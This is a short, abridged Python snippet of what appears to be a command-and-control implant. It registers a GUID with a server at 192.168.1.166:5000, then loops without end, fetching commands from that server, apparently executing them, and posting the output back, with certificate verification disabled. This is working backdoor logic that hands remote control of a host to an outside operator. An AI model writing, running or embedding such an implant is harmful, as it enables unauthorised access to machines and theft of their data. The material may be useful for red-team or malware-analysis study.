...
def bleh(beacon_command, GUID):
    ...
    out = out.decode()
    requests.post('https://192.168.1.166:5000/schema', data=out, headers=headers, verify=False)
...
# Send our HELLO/GUID
requests.get(f'https://192.168.1.166:5000/', headers=headers, verify=False)
...
while 1:
    ...
    a = requests.get(f'https://192.168.1.166:5000/{GUID}.html', headers=headers, verify=False)
    cmd = a.text
    print(cmd)
    print('got command')
    bleh(cmd, GUID)
